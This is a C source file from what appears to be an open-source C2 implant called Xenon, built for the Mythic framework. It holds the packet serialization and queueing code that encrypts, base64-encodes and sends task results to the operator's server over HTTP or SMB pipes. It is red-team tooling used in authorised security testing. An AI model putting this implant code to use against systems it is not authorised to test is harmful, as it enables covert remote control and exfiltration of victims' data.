/**
 * Built upon the Talon agent's binary serialization method - size, data 
 * @ref https://github.com/HavocFramework/Talon/blob/main/Agent/Source/Package.c
*/

#include "Xenon.h"
#include "Package.h"
#include "Parser.h"
#include "Crypto.h"
#include "Utils.h"
#include "Network.h"
#include "Config.h"
#include "Aes.h"
#include "hmac_sha256.h"
#include "Task.h"

// Creates new Package.
// If init is TRUE, then adds the current commandID and the agent UUID to the package.
PPackage PackageInit(BYTE commandID, BOOL init)
{
    PPackage package = (PPackage)LocalAlloc(LPTR, sizeof(Package));

    package->buffer = LocalAlloc(LPTR, sizeof(BYTE));
    if (!package->buffer)
        return NULL;

    package->length = 0;
    package->Sent   = FALSE;

    if (init)
    {
        PackageAddString(package, xenonConfig->agentID, FALSE);
        PackageAddByte(package, commandID);
    }   // Length is now 37 bytes (UUID + command ID)

    return package;
}

BOOL PackageAddByte(PPackage package, BYTE byte)
{
    package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(BYTE), LMEM_MOVEABLE);
    if (!package->buffer)
        return FALSE;

    ((PBYTE)package->buffer + package->length)[0] = byte;
    package->length += 1;

    return TRUE;
}

BOOL PackageAddShort(PPackage package, USHORT value)
{
    package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(USHORT), LMEM_MOVEABLE);
    if (!package->buffer)
        return FALSE;

    *(USHORT *)((PBYTE)package->buffer + package->length) = value;
    package->length += sizeof(USHORT);

    return TRUE;
}

BOOL PackageAddInt32(PPackage package, UINT32 value)
{
    package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(UINT32), LMEM_MOVEABLE | LMEM_ZEROINIT);
    if (!package->buffer)
        return FALSE;

    addInt32ToBuffer((PUCHAR)(package->buffer) + package->length, value);
    package->length += sizeof(UINT32);

    return TRUE;
}

BOOL PackageAddInt32_LE(PPackage package, UINT32 value)
{
    package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(UINT32), LMEM_MOVEABLE | LMEM_ZEROINIT);
    if (!package->buffer)
        return FALSE;

    addInt32ToBuffer_LE((PUCHAR)(package->buffer) + package->length, value);
    package->length += sizeof(UINT32);

    return TRUE;
}

BOOL PackageAddInt64(PPackage package, UINT64 value)
{
    package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(UINT64), LMEM_MOVEABLE | LMEM_ZEROINIT);
    if (!package->buffer)
        return FALSE;

    addInt64ToBuffer((PUCHAR)package->buffer, value);
    package->length += sizeof(UINT64);

    return TRUE;
}

BOOL PackageAddBytes(PPackage package, PBYTE data, SIZE_T size, BOOL copySize)
{
    if (copySize && size)
    {
        if (!PackageAddInt32(package, size))
            return FALSE;
    }

    if (size)
    {
        // Reallocate the size of package->buffer + size of new data
        package->buffer = LocalReAlloc(package->buffer, package->length + size, LMEM_MOVEABLE | LMEM_ZEROINIT);
        if (!package->buffer)
            return FALSE;

        if (copySize)
            addInt32ToBuffer((PBYTE)package->buffer + (package->length - sizeof(UINT32)), size);

        // Copy new data to end of package->buffer
        memcpy((PBYTE)package->buffer + package->length, data, size);

        // Adjust package size accordingly
        package->length += size;
    }

    return TRUE;
}

BOOL PackageAddString(PPackage package, PCHAR data, BOOL copySize)
{
    if (!PackageAddBytes(package, (PBYTE)data, strlen(data), copySize))
        return FALSE;

    return TRUE;
}

BOOL PackageAddWString(PPackage package, PWCHAR data, BOOL copySize)
{
    if (!PackageAddBytes(package, (PBYTE)data, lstrlenW(data) * 2, copySize))
        return FALSE;

    return TRUE;
}

// BeaconFormatPrintf
BOOL PackageAddFormatPrintf(PPackage package, BOOL copySize, char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);

    // Determine how much space is needed for the formatted string
    int requiredLength = vsnprintf(NULL, 0, fmt, args) + 1; // +1 for null terminator

    va_end(args);

    // Allocate a temporary buffer for the formatted string
    char *tempBuffer = (char *)malloc(requiredLength);
    if (tempBuffer == NULL)
    {
        return FALSE; // Memory allocation failed
    }

    va_start(args, fmt);
    vsnprintf(tempBuffer, requiredLength, fmt, args);
    va_end(args);

    // Use addString to add the formatted string to the package
    if (!PackageAddString(package, tempBuffer, copySize))
        return FALSE;

    // Free the temporary buffer
    free(tempBuffer);

    return TRUE;
}

// Sends ERROR post_response to server for individual task
VOID PackageError(PCHAR taskUuid, UINT32 errorCode)
{
    // Initialize post_response package
    PPackage error = PackageInit(POST_RESPONSE, TRUE);
    PackageAddString(error, taskUuid, FALSE);

    // Error information
    PackageAddInt32(error, errorCode);           // specific error code
    PackageAddByte(error, TASK_FAILED);          // Error status

    // Send
    PackageSend(error, NULL);

    // Cleanup
    PackageDestroy(error);
}

// Queues package with complete status (no message ID)
VOID PackageComplete(PCHAR taskUuid, PPackage package)
{
    /* Create post_response Package */
    PPackage data = PackageInit(NULL, FALSE);
    PackageAddByte(data, POST_RESPONSE);
    /* Add Task UUID */
    PackageAddString(data, taskUuid, FALSE);
    /* Add Data */
    if (package != NULL && package->buffer != NULL)
    {
        // Use data from package
        PackageAddBytes(data, (PBYTE)package->buffer, package->length, TRUE);
    }
    else
    {
        PackageAddInt32(data, 0);
    }

    /* Add Status Byte to End */
    PackageAddByte(data, TASK_COMPLETE);

    /* Queue Packet To Send */
    // PackageSend(data, NULL);
    PackageQueue(data);

    // Cleanup
    // PackageDestroy(data);
}

/**
 * @brief Write the specified buffer to the specified pipe
 * @param Handle handle to the pipe
 * @param Buffer Message to write
 * @param Length Size of message
 * @return pipe write successful or not
 */
BOOL PackageSendPipe(HANDLE hPipe, PVOID Buffer, SIZE_T Length) 
{
    DWORD Written = 0;
    DWORD Total   = 0;

    do {
        if ( !WriteFile(hPipe, Buffer + Total, MIN( ( Length - Total ), PIPE_BUFFER_MAX ), &Written , NULL) ) {
            _err("WriteFile failed. ERROR : %d", GetLastError());
            return FALSE;
        }

        Total += Written;
    } while ( Total < Length );

    _dbg("Finished. Sent %d bytes to SMB Comms channel.", Written);

    return TRUE;
}


// Function to base64 encode the input package and modify it
BOOL PackageBase64Encode(PPackage package)
{
    if (package == NULL || package->buffer == NULL || package->length == 0)
        return FALSE; // Handle null input

    BOOL success = FALSE;
    SIZE_T encodedLen = calculate_base64_encoded_size(package->length);

    // Allocate memory for the encoded buffer
    void *encodeBuffer = LocalAlloc(LPTR, encodedLen + 1);
    if (encodeBuffer == NULL)
    {
        _err("Failed to allocate memory for encoded buffer. ERROR: %d", GetLastError());
        return FALSE;
    }

    // Perform base64 encoding
    int status = base64_encode((const unsigned char *)package->buffer, package->length, encodeBuffer, &encodedLen);
    if (status != 0)
    {
        _err("Base64 encoding failed");
        goto cleanup;
    }

    // Resize the package buffer
    void *reallocBuffer = LocalReAlloc(package->buffer, encodedLen + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
    if (!reallocBuffer)
    {
        _err("Failed to reallocate package buffer");
        goto cleanup;
    }

    package->buffer = reallocBuffer;

    // Copy the encoded buffer back into the package buffer
    memcpy(package->buffer, encodeBuffer, encodedLen);
    ((char *)package->buffer)[encodedLen] = '\0';  // Null-terminate

    package->length = encodedLen;
    success = TRUE;

cleanup:
    if (encodeBuffer)
        LocalFree(encodeBuffer);

    return success;
}


/**
 * @brief Immediately send a package to the server, ignoring response.
 */
// BOOL PackageSendNow(PPackage package, PPARSER response)
// {
//     BOOL bStatus = FALSE;

//     if ( xenonConfig->isEncryption ) 
//     {
//         if ( !CryptoMythicEncryptPackage(package) )
//             return FALSE;
//     }

//     if ( !PackageBase64Encode(package) )
//         return FALSE;

//     _dbg("Client -> Server message (length: %d bytes)", package->length);

//     PBYTE pOutData      = NULL;
//     SIZE_T sOutLen      = 0;

// #ifdef SMB_TRANSPORT

//     if ( !NetworkSmbSend(package, NULL, NULL) )
//     {
//         _err("Failed to send network packet!");
//         return FALSE;
//     }

// #endif

//     // TODO remove comment
//     // In the case where SMB receive doesnt return anything
//     if (pOutData == NULL || sOutLen == 0) {
//         return TRUE;
//     }

//     // Sometimes we don't care about the response data (post_response)
//     // Check response pointer for NULL to skip processes the response.
//     if (response == NULL)
//         goto end;

//     // Fill parser structure with data
//     ParserNew(response, pOutData, sOutLen);

//     ////////////////////////////////////////
//     ////// Response Mythic package /////////
//     ////////////////////////////////////////
//     _dbg("\n\n===================RESPONSE======================\n");
//     _dbg("Server -> Client message (length: %d bytes)", response->Length);
 
//     if (!ParserBase64Decode(response)) {
//         _err("Base64 decoding failed");
//         goto end;
//     }

//     // Check payload UUID
//     SIZE_T sizeUuid             = TASK_UUID_SIZE;
//     PCHAR receivedPayloadUUID   = NULL; 
//     receivedPayloadUUID         = ParserGetString(response, &sizeUuid);
//     // Use memcmp to pass a strict size of bytes to compare
//     if (memcmp(receivedPayloadUUID, xenonConfig->agentID, TASK_UUID_SIZE) != 0) {
//         _err("Check-in payload UUID doesn't match what we have. Expected - %s : Received - %s", xenonConfig->agentID, receivedPayloadUUID);
//         goto end;
//     }
    
    
//     // Mythic AES decryption
//     if (xenonConfig->isEncryption)
//     {
//         if (!CryptoMythicDecryptParser(response))
//             goto end;
//     }

    
//     _dbg("Decrypted Response");
//     print_bytes(response->Buffer, response->Length);
    

//     bStatus = TRUE;

// end:

//     if ( pOutData != NULL )
//     {
//         memset(pOutData, 0, sOutLen);
//         LocalFree(pOutData);
//         pOutData = NULL;
//     }

//     return bStatus;
// }

/*
    Core function for sending C2 messages.
    - Mythic encryption (true|false)
    - Base64 encode
    - C2 profile transforms (using HttpX container for C2)
    - Base64 decode
    - Mythic decryption (true|false)
*/
BOOL PackageSend(PPackage package, PPARSER response)
{
    BOOL bStatus = FALSE;
    ////////////////////////////////////////
    ////////// Send Mythic package /////////
    ////////////////////////////////////////
    _dbg("\n\n===================REQUEST======================\n");

    // Mythic AES encryption
    if (xenonConfig->isEncryption) 
    {
        if (!CryptoMythicEncryptPackage(package))
            return FALSE;
    }

    if ( !PackageBase64Encode(package) ) {
        _err("Base64 encoding failed");
        return FALSE;
    }

    _dbg("Client -> Server message (length: %d bytes)", package->length);

    PBYTE  pOutData      = NULL;
    SIZE_T sOutLen       = 0;
    BOOL   IsGetResponse = TRUE;

    if ( response == NULL ) {
        IsGetResponse = FALSE;
    }

    if ( !NetworkRequest(package, &pOutData, &sOutLen, IsGetResponse) ) {
        _err("Failed to send network packet!");
        return FALSE;
    }

    // TODO remove comment
    // In the case where SMB receive doesnt return anything
    if (pOutData == NULL || sOutLen == 0) {
        return TRUE;
    }

    // Sometimes we don't care about the response data (post_response)
    // Check response pointer for NULL to skip processes the response.
    if (IsGetResponse == FALSE) {
        bStatus = TRUE;
        goto end;
    }

    /* Copy output to response parser */
    ParserNew(response, pOutData, sOutLen);

    ////////////////////////////////////////
    ////// Response Mythic package /////////
    ////////////////////////////////////////
    _dbg("\n\n===================RESPONSE======================\n");
    _dbg("Server -> Client message (length: %d bytes)", response->Length);
 
    if (!ParserBase64Decode(response)) {
        _err("Base64 decoding failed");
        goto end;
    }

    // Check payload UUID
    SIZE_T sizeUuid             = TASK_UUID_SIZE;
    PCHAR receivedPayloadUUID   = NULL; 
    receivedPayloadUUID         = ParserGetString(response, &sizeUuid);
    // Use memcmp to pass a strict size of bytes to compare
    if (memcmp(receivedPayloadUUID, xenonConfig->agentID, TASK_UUID_SIZE) != 0) {
        _err("Check-in payload UUID doesn't match what we have. Expected - %s : Received - %s", xenonConfig->agentID, receivedPayloadUUID);
        goto end;
    }
    
    
    // Mythic AES decryption
    if (xenonConfig->isEncryption)
    {
        if (!CryptoMythicDecryptParser(response))
            goto end;
    }

    
    _dbg("Decrypted Response");
    print_bytes(response->Buffer, response->Length);
    

    bStatus = TRUE;

end:

    if ( pOutData != NULL )
    {
        memset(pOutData, 0, sOutLen);
        LocalFree(pOutData);
        pOutData = NULL;
    }

    return bStatus;
}


/**
 * @brief Add a package to the sender Queue
 */
VOID PackageQueue(PPackage package)
{
    _dbg("Adding package to queue...");
    
    PPackage List = NULL;

    if ( !package ) {
        return;
    }
    
    /* If there are no queued packages, this is the first */
    if ( !xenonConfig->PackageQueue )
    {
        xenonConfig->PackageQueue  = package;
    }
    else
    {
        /* Add to the end of linked-list */
        List = xenonConfig->PackageQueue;
        while ( List->Next ) {
            List = List->Next;
        }
        List->Next  = package;
    }
    
    return TRUE;
}

/**
 * @brief Send all the queued packages to server
 * 
 * @return BOOL - Did request succeed
 */
BOOL PackageSendAll(PPARSER response)
{
    _dbg("Sending All Queued Packages to Server ...");

    PPackage Current  = NULL;
    PPackage Entry    = NULL;
    PPackage Prev     = NULL;
    PPackage Next     = NULL;
    PPackage Package  = NULL;
    BOOL     Success  = FALSE;

    /* Nothing to send */
    if ( !xenonConfig->PackageQueue )
        return TRUE;

    /* Add all packages into a single post_response packet */
    Package = PackageInit(POST_RESPONSE, TRUE);

    Current = xenonConfig->PackageQueue;

    /* Include as many packages as fit */
    while ( Current )
    {
        if ( (Package->length + Current->length) > MAX_REQUEST_LENGTH )
        {
            _dbg("[INFO] MAX_REQUEST_LENGTH reached, deferring remaining packages");
            break;
        }

        _dbg("Adding package (%d bytes)", Current->length);

        PackageAddBytes(Package, Current->buffer, Current->length, FALSE);
        Current->Sent = TRUE;

        Current = Current->Next;
    }

    _dbg("Sending [%d] bytes to server now...", Package->length);

    /* Send packet */
    if ( !PackageSend(Package, response) )
    {
        _err("Packet failed to send");
        goto CLEANUP;
    }

    Success = TRUE;

    /* Cleanup only SENT packages */
    Entry = xenonConfig->PackageQueue;
    Prev  = NULL;

    while ( Entry )
    {
        Next = Entry->Next;

        if ( Entry->Sent )
        {
            if ( Prev )
                Prev->Next = Next;
            else
                xenonConfig->PackageQueue = Next;

            PackageDestroy(Entry);
        }
        else
        {
            Prev = Entry;
        }

        Entry = Next;
    }

CLEANUP:

    PackageDestroy(Package);

    return Success;
}




VOID PackageDestroy(PPackage package)
{
    if (!package)
        return;

    if (!package->buffer)
        return;

    // Erase buffer
    memset(package->buffer, 0, package->length);
    LocalFree(package->buffer);
    package->buffer = NULL;

    // Erase struct
    memset(package, 0, sizeof(Package));
    LocalFree(package);
    package = NULL;
}